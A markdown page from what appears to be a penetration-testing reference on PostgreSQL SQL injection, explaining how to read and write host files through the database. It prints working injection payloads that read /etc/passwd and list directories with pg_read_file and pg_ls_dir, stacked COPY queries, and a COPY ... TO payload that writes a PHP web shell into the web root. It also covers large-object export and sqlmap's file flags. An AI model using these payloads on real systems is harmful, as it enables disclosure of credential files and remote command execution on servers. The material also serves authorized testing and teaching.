---
title: "Reading and writing files through PostgreSQL injection"
order: 4
description: "File read and write primitives in PostgreSQL injection: pg_read_file, pg_ls_dir, COPY into and out of tables, and large objects, with the roles each requires."
keywords:
  - pg_read_file
  - pg_ls_dir
  - COPY TO
  - lo_import
  - PostgreSQL file access
---

# File manipulation

A privileged PostgreSQL role can read and write files on the host, which leads to source and credential disclosure and, through writing, to web shells. These primitives need a superuser or, on version 11 and later, membership of `pg_read_server_files` / `pg_write_server_files`.

`pg_read_file()` returns a file's contents, and `pg_ls_dir()` lists a directory:

```sql
' UNION SELECT pg_read_file('/etc/passwd',0,100000),NULL,NULL-- 
' UNION SELECT string_agg(f,','),NULL,NULL FROM pg_ls_dir('/etc') f-- 
```

`COPY` reads a file into a table, which is useful when the reflected channel wants rows rather than a single string. It needs a stacked query to create the table:

```sql
'; CREATE TABLE f(line text); COPY f FROM '/etc/passwd'-- 
' UNION SELECT line,NULL,NULL FROM f-- 
```

Writing uses `COPY ... TO`, which drops attacker content at a chosen path (a web shell under the document root, for example):

```sql
'; COPY (SELECT '<?php system($_GET[0]); ?>') TO '/var/www/html/s.php'-- 
```

For binary content, large objects give byte-level control: `lo_import('/path')` loads a file into a large object, `lo_from_bytea`/`lo_put` build one from supplied bytes, and `lo_export(oid,'/path')` writes it out. As with command execution, `COPY ... TO` and large-object export need write permission for the PostgreSQL process user at the destination, so knowing the data directory and web root (read from `postgresql.conf` first) guides where a write will land.

## Tools

- **sqlmap**: reads and writes host files with `--file-read` and `--file-write`.
- **psql**: official client to run `pg_read_file`, `COPY`, and large-object functions directly.

## References

- PostgreSQL Documentation: `pg_read_file`, `pg_ls_dir`, COPY, large objects
- OWASP Testing Guide: Testing for SQL Injection
